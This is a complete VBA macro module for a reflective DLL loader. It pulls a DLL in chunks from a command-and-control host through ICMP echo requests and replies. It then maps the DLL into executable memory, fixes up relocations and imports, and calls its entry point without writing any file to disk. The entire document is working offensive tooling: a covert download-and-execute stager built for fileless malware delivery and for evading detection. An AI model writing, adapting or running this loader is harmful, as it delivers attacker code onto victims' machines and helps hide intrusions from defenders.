Option Explicit

' Reflective DLL Loader — retrieves a DLL over ICMP echo request/reply and manually maps it in-process.
' No file is written to disk. A custom ICMP listener on the C2 returns payload chunks in echo replies.
' Standalone — all declares inline. Paste into a standard module.
'
' Protocol:
'   Request data is 4 bytes (Long, little-endian):
'     &HFFFFFFFF = size query  -> reply data = 4 bytes (total payload size as Long)
'     N          = byte offset -> reply data = up to CHUNK_SIZE bytes of payload at that offset
'
'   The C2 runs a custom ICMP responder (raw socket listener) that reads the request data,
'   looks up the requested chunk, and sends it back as the echo reply payload.

' ===================== CONFIG =====================

Private Const SERVER_HOST As String = "192.168.1.212"
Private Const CHUNK_SIZE As Long = 1024
Private Const ICMP_TIMEOUT As Long = 5000

' ===================== CONSTANTS =====================

Private Const MEM_COMMIT As Long = &H1000
Private Const MEM_RESERVE As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE As Long = &H40

Private Const IMAGE_DOS_SIGNATURE As Integer = &H5A4D
Private Const IMAGE_NT_SIGNATURE As Long = &H4550

#If Win64 Then
    Private Const PTR_SIZE As Long = 8
    Private Const OPT_IMAGE_BASE As Long = 24
    Private Const OPT_DATA_DIR As Long = 112
    Private Const PE_MAGIC As Integer = &H20B
    Private Const ECHO_REPLY_SIZE As Long = 40
#Else
    Private Const PTR_SIZE As Long = 4
    Private Const OPT_IMAGE_BASE As Long = 28
    Private Const OPT_DATA_DIR As Long = 96
    Private Const PE_MAGIC As Integer = &H10B
    Private Const ECHO_REPLY_SIZE As Long = 28
#End If

Private Const OPT_ENTRY_POINT As Long = 16
Private Const OPT_SIZE_OF_IMAGE As Long = 56
Private Const OPT_SIZE_OF_HEADERS As Long = 60
Private Const SECTION_HEADER_SIZE As Long = 40
Private Const IMPORT_DESC_SIZE As Long = 20

Private Const DLL_PROCESS_ATTACH As Long = 1
Private Const IMAGE_REL_BASED_DIR64 As Long = 10
Private Const IMAGE_REL_BASED_HIGHLOW As Long = 3

Private Const SIZE_REQUEST As Long = -1  ' &HFFFFFFFF

' ===================== DECLARES =====================

' Kernel32
Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
    ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function VirtualFree Lib "kernel32" ( _
    ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, _
    ByVal dwFreeType As Long) As Long
Private Declare PtrSafe Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" ( _
    ByVal Destination As LongPtr, ByVal Source As LongPtr, ByVal Length As LongPtr)
Private Declare PtrSafe Function LoadLibraryAPtr Lib "kernel32" Alias "LoadLibraryA" ( _
    ByVal lpLibFileName As LongPtr) As LongPtr
Private Declare PtrSafe Function GetProcAddressPtr Lib "kernel32" Alias "GetProcAddress" ( _
    ByVal hModule As LongPtr, ByVal lpProcName As LongPtr) As LongPtr
Private Declare PtrSafe Function NtFlushInstructionCache Lib "ntdll" ( _
    ByVal ProcessHandle As LongPtr, ByVal BaseAddress As LongPtr, _
    ByVal Length As LongPtr) As Long

' ICMP (iphlpapi)
Private Declare PtrSafe Function IcmpCreateFile Lib "iphlpapi" () As LongPtr
Private Declare PtrSafe Function IcmpCloseHandle Lib "iphlpapi" ( _
    ByVal IcmpHandle As LongPtr) As Long
Private Declare PtrSafe Function IcmpSendEcho Lib "iphlpapi" ( _
    ByVal IcmpHandle As LongPtr, ByVal DestinationAddress As Long, _
    ByVal RequestData As LongPtr, ByVal RequestSize As Long, _
    ByVal RequestOptions As LongPtr, ByVal ReplyBuffer As LongPtr, _
    ByVal ReplySize As Long, ByVal Timeout As Long) As Long

' User32 — trampoline for calling DllMain
Private Declare PtrSafe Function CallWindowProcW Lib "user32" ( _
    ByVal lpPrevWndFunc As LongPtr, ByVal hWnd As LongPtr, _
    ByVal Msg As LongPtr, ByVal wParam As LongPtr, _
    ByVal lParam As LongPtr) As LongPtr

' ===================== MEMORY HELPERS =====================

Private Function RdLong(ByVal addr As LongPtr) As Long
    CopyMemory VarPtr(RdLong), addr, 4
End Function

Private Function RdWord(ByVal addr As LongPtr) As Integer
    CopyMemory VarPtr(RdWord), addr, 2
End Function

Private Function RdPtr(ByVal addr As LongPtr) As LongPtr
    CopyMemory VarPtr(RdPtr), addr, CLngPtr(PTR_SIZE)
End Function

Private Sub WrPtr(ByVal addr As LongPtr, ByVal value As LongPtr)
    CopyMemory addr, VarPtr(value), CLngPtr(PTR_SIZE)
End Sub

' ===================== IP HELPER =====================

Private Function ParseIPv4(ByVal ip As String) As Long
    Dim parts() As String: parts = Split(ip, ".")
    If UBound(parts) <> 3 Then Exit Function
    Dim b(0 To 3) As Byte
    Dim i As Long
    For i = 0 To 3: b(i) = CByte(parts(i)): Next
    CopyMemory VarPtr(ParseIPv4), VarPtr(b(0)), 4
End Function

' ===================== ICMP EXCHANGE =====================

' Sends an ICMP echo with reqData and returns the reply payload in replyData.
' Returns True on success.
Private Function IcmpExchange(ByVal hIcmp As LongPtr, ByVal destAddr As Long, _
                              ByRef reqData() As Byte, ByRef replyData() As Byte) As Boolean
    Dim replyBufSize As Long
    replyBufSize = ECHO_REPLY_SIZE + CHUNK_SIZE + 64

    Dim replyBuf() As Byte
    ReDim replyBuf(0 To replyBufSize - 1)

    Dim numReplies As Long
    numReplies = IcmpSendEcho(hIcmp, destAddr, VarPtr(reqData(0)), _
                              CLng(UBound(reqData) + 1), 0, _
                              VarPtr(replyBuf(0)), replyBufSize, ICMP_TIMEOUT)

    If numReplies = 0 Then Exit Function

    ' ICMP_ECHO_REPLY layout — offsets are the same on x86 and x64 up to DataSize:
    '   offset  4: Status  (Long, 0 = success)
    '   offset 12: DataSize (unsigned short)
    '   offset 16: Data     (pointer to reply data within replyBuf)
    Dim status As Long
    CopyMemory VarPtr(status), VarPtr(replyBuf(4)), 4
    If status <> 0 Then Exit Function

    ' Read DataSize as unsigned short
    Dim dsLo As Byte, dsHi As Byte
    CopyMemory VarPtr(dsLo), VarPtr(replyBuf(12)), 1
    CopyMemory VarPtr(dsHi), VarPtr(replyBuf(13)), 1
    Dim dataSize As Long
    dataSize = CLng(dsLo) Or (CLng(dsHi) * 256)
    If dataSize = 0 Then Exit Function

    ' Read Data pointer
    Dim dataPtr As LongPtr
    CopyMemory VarPtr(dataPtr), VarPtr(replyBuf(16)), CLngPtr(PTR_SIZE)
    If dataPtr = 0 Then Exit Function

    ReDim replyData(0 To dataSize - 1)
    CopyMemory VarPtr(replyData(0)), dataPtr, CLngPtr(dataSize)

    IcmpExchange = True
End Function

' ===================== ICMP DOWNLOAD =====================

Private Function DownloadDLL() As Byte()
    Dim destAddr As Long
    destAddr = ParseIPv4(SERVER_HOST)
    If destAddr = 0 Then
        Debug.Print "[!] Invalid server IP"
        Exit Function
    End If

    Dim hIcmp As LongPtr
    hIcmp = IcmpCreateFile()
    If hIcmp = 0 Or hIcmp = -1 Then
        Debug.Print "[!] IcmpCreateFile failed"
        Exit Function
    End If

    ' Step 1: query total payload size
    Dim reqData(0 To 3) As Byte
    Dim sizeReq As Long: sizeReq = SIZE_REQUEST
    CopyMemory VarPtr(reqData(0)), VarPtr(sizeReq), 4

    Dim sizeReply() As Byte
    If Not IcmpExchange(hIcmp, destAddr, reqData, sizeReply) Then
        Debug.Print "[!] Size query failed"
        IcmpCloseHandle hIcmp
        Exit Function
    End If

    If UBound(sizeReply) < 3 Then
        Debug.Print "[!] Size reply too short"
        IcmpCloseHandle hIcmp
        Exit Function
    End If

    Dim totalSize As Long
    CopyMemory VarPtr(totalSize), VarPtr(sizeReply(0)), 4
    Debug.Print "[+] Total payload size: " & totalSize & " bytes"

    If totalSize <= 0 Then
        Debug.Print "[!] Invalid payload size"
        IcmpCloseHandle hIcmp
        Exit Function
    End If

    ' Step 2: retrieve chunks
    Dim result() As Byte
    ReDim result(0 To totalSize - 1)
    Dim offset As Long

    Do While offset < totalSize
        ' Request data = byte offset
        CopyMemory VarPtr(reqData(0)), VarPtr(offset), 4

        Dim chunkReply() As Byte
        If Not IcmpExchange(hIcmp, destAddr, reqData, chunkReply) Then
            Debug.Print "[!] Chunk request failed at offset " & offset
            IcmpCloseHandle hIcmp
            Exit Function
        End If

        Dim chunkLen As Long
        chunkLen = UBound(chunkReply) + 1

        ' Don't overshoot
        If offset + chunkLen > totalSize Then chunkLen = totalSize - offset

        CopyMemory VarPtr(result(offset)), VarPtr(chunkReply(0)), CLngPtr(chunkLen)
        offset = offset + chunkLen

        If offset Mod (CHUNK_SIZE * 50) < CHUNK_SIZE Then
            Debug.Print "[*] " & offset & "/" & totalSize & " bytes"
        End If
    Loop

    IcmpCloseHandle hIcmp

    Debug.Print "[+] Received " & totalSize & " bytes over ICMP"
    DownloadDLL = result
End Function

' ===================== PE MAPPING =====================

Private Function MapAndExecute(ByRef pe() As Byte) As LongPtr
    Dim raw As LongPtr
    raw = VarPtr(pe(0))

    If RdWord(raw) <> IMAGE_DOS_SIGNATURE Then
        Debug.Print "[!] Invalid MZ signature"
        Exit Function
    End If

    Dim e_lfanew As Long
    e_lfanew = RdLong(raw + 60)

    Dim ntHdr As LongPtr
    ntHdr = raw + CLngPtr(e_lfanew)

    If RdLong(ntHdr) <> IMAGE_NT_SIGNATURE Then
        Debug.Print "[!] Invalid PE signature"
        Exit Function
    End If

    Dim fileHdr As LongPtr: fileHdr = ntHdr + 4
    Dim numSections As Integer: numSections = RdWord(fileHdr + 2)
    Dim optHdrSize As Integer: optHdrSize = RdWord(fileHdr + 16)
    Dim optHdr As LongPtr: optHdr = fileHdr + 20

    If RdWord(optHdr) <> PE_MAGIC Then
        Debug.Print "[!] PE architecture mismatch (wrong bitness)"
        Exit Function
    End If

    Dim entryPointRVA As Long: entryPointRVA = RdLong(optHdr + OPT_ENTRY_POINT)
    Dim imageBase As LongPtr: imageBase = RdPtr(optHdr + OPT_IMAGE_BASE)
    Dim sizeOfImage As Long: sizeOfImage = RdLong(optHdr + OPT_SIZE_OF_IMAGE)
    Dim sizeOfHeaders As Long: sizeOfHeaders = RdLong(optHdr + OPT_SIZE_OF_HEADERS)

    Dim importDirRVA As Long: importDirRVA = RdLong(optHdr + OPT_DATA_DIR + 8)
    Dim relocDirRVA As Long: relocDirRVA = RdLong(optHdr + OPT_DATA_DIR + 40)
    Dim relocDirSize As Long: relocDirSize = RdLong(optHdr + OPT_DATA_DIR + 44)

    Debug.Print "[*] SizeOfImage: " & sizeOfImage & "  Sections: " & numSections

    Dim allocBase As LongPtr
    allocBase = VirtualAlloc(imageBase, CLngPtr(sizeOfImage), _
                             MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    If allocBase = 0 Then
        allocBase = VirtualAlloc(0, CLngPtr(sizeOfImage), _
                                 MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    End If
    If allocBase = 0 Then
        Debug.Print "[!] VirtualAlloc failed"
        Exit Function
    End If
    Debug.Print "[+] Allocated at 0x" & Hex(allocBase)

    CopyMemory allocBase, raw, CLngPtr(sizeOfHeaders)

    Dim secHdr As LongPtr
    secHdr = optHdr + CLngPtr(optHdrSize)

    Dim i As Long
    For i = 0 To numSections - 1
        Dim sh As LongPtr: sh = secHdr + CLngPtr(i * SECTION_HEADER_SIZE)
        Dim secVA As Long: secVA = RdLong(sh + 12)
        Dim secRawSz As Long: secRawSz = RdLong(sh + 16)
        Dim secRawPtr As Long: secRawPtr = RdLong(sh + 20)

        If secRawSz > 0 And secRawPtr > 0 Then
            CopyMemory allocBase + CLngPtr(secVA), raw + CLngPtr(secRawPtr), CLngPtr(secRawSz)
        End If
    Next
    Debug.Print "[+] " & numSections & " sections mapped"

    Dim delta As LongPtr
    delta = allocBase - imageBase

    If delta <> 0 And relocDirRVA <> 0 And relocDirSize <> 0 Then
        ProcessRelocations allocBase, CLngPtr(relocDirRVA), CLngPtr(relocDirSize), delta
        Debug.Print "[+] Relocations applied (delta=0x" & Hex(delta) & ")"
    End If

    If importDirRVA <> 0 Then
        ProcessImports allocBase, CLngPtr(importDirRVA)
        Debug.Print "[+] Imports resolved"
    End If

    NtFlushInstructionCache -1, allocBase, CLngPtr(sizeOfImage)

    Dim ep As LongPtr
    ep = allocBase + CLngPtr(entryPointRVA)
    Debug.Print "[*] Calling entry point at 0x" & Hex(ep)

    CallWindowProcW ep, allocBase, DLL_PROCESS_ATTACH, 0, 0

    Debug.Print "[+] DllMain returned"
    MapAndExecute = allocBase
End Function

' ===================== RELOCATIONS =====================

Private Sub ProcessRelocations(ByVal base As LongPtr, ByVal relocRVA As LongPtr, _
                                ByVal relocSize As LongPtr, ByVal delta As LongPtr)
    Dim block As LongPtr: block = base + relocRVA
    Dim blockEnd As LongPtr: blockEnd = block + relocSize

    Do While block < blockEnd
        Dim blockVA As Long: blockVA = RdLong(block)
        Dim blockSz As Long: blockSz = RdLong(block + 4)
        If blockSz = 0 Then Exit Do

        Dim numEntries As Long
        numEntries = (blockSz - 8) \ 2

        Dim j As Long
        For j = 0 To numEntries - 1
            Dim lo As Byte, hi As Byte
            CopyMemory VarPtr(lo), block + 8 + CLngPtr(j * 2), 1
            CopyMemory VarPtr(hi), block + 8 + CLngPtr(j * 2) + 1, 1

            Dim rType As Long: rType = (CLng(hi) \ 16) And &HF
            Dim rOffset As Long: rOffset = CLng(lo) Or ((CLng(hi) And &HF) * 256)

            Dim target As LongPtr
            target = base + CLngPtr(blockVA) + CLngPtr(rOffset)

            Select Case rType
                Case IMAGE_REL_BASED_DIR64
                    Dim val64 As LongPtr: val64 = RdPtr(target)
                    WrPtr target, val64 + delta

                Case IMAGE_REL_BASED_HIGHLOW
                    Dim val32 As Long: val32 = RdLong(target)
                    Dim newVal As Long
                    newVal = val32 + CLng(delta And &HFFFFFFFF)
                    CopyMemory target, VarPtr(newVal), 4

                Case 0
            End Select
        Next

        block = block + CLngPtr(blockSz)
    Loop
End Sub

' ===================== IMPORTS =====================

Private Sub ProcessImports(ByVal base As LongPtr, ByVal importRVA As LongPtr)
    Dim desc As LongPtr: desc = base + importRVA

    Do
        Dim nameRVA As Long: nameRVA = RdLong(desc + 12)
        If nameRVA = 0 Then Exit Do

        Dim hMod As LongPtr
        hMod = LoadLibraryAPtr(base + CLngPtr(nameRVA))
        If hMod = 0 Then GoTo NextDesc

        Dim origThunkRVA As Long: origThunkRVA = RdLong(desc)
        Dim thunkRVA As Long: thunkRVA = RdLong(desc + 16)

        Dim intPtr As LongPtr
        If origThunkRVA <> 0 Then
            intPtr = base + CLngPtr(origThunkRVA)
        Else
            intPtr = base + CLngPtr(thunkRVA)
        End If

        Dim iatPtr As LongPtr: iatPtr = base + CLngPtr(thunkRVA)

        Do
            Dim thunkVal As LongPtr: thunkVal = RdPtr(intPtr)
            If thunkVal = 0 Then Exit Do

            Dim funcAddr As LongPtr
            Dim hiByte As Byte
            CopyMemory VarPtr(hiByte), intPtr + CLngPtr(PTR_SIZE - 1), 1

            If (hiByte And &H80) <> 0 Then
                funcAddr = GetProcAddressPtr(hMod, thunkVal And CLngPtr(&HFFFF&))
            Else
                Dim hintNameRVA As Long: hintNameRVA = RdLong(intPtr)
                funcAddr = GetProcAddressPtr(hMod, base + CLngPtr(hintNameRVA) + 2)
            End If

            WrPtr iatPtr, funcAddr

            intPtr = intPtr + CLngPtr(PTR_SIZE)
            iatPtr = iatPtr + CLngPtr(PTR_SIZE)
        Loop

NextDesc:
        desc = desc + IMPORT_DESC_SIZE
    Loop
End Sub

' ===================== ENTRY POINT =====================

Public Sub Run()
    Debug.Print "=== Reflective DLL Loader (ICMP) ==="
    Debug.Print "[*] Target: " & SERVER_HOST & " (chunk=" & CHUNK_SIZE & "b)"

    Dim pe() As Byte
    pe = DownloadDLL()

    Dim sz As Long
    On Error Resume Next
    sz = UBound(pe) + 1
    On Error GoTo 0

    If sz = 0 Then
        MsgBox "Download failed — is the ICMP listener running?", vbExclamation
        Exit Sub
    End If

    Dim baseAddr As LongPtr
    baseAddr = MapAndExecute(pe)

    If baseAddr = 0 Then
        MsgBox "Mapping failed — check Immediate Window (Ctrl+G)", vbExclamation
    Else
        Debug.Print "[+] DLL mapped at 0x" & Hex(baseAddr)
    End If

    Debug.Print "=== Done ==="
End Sub
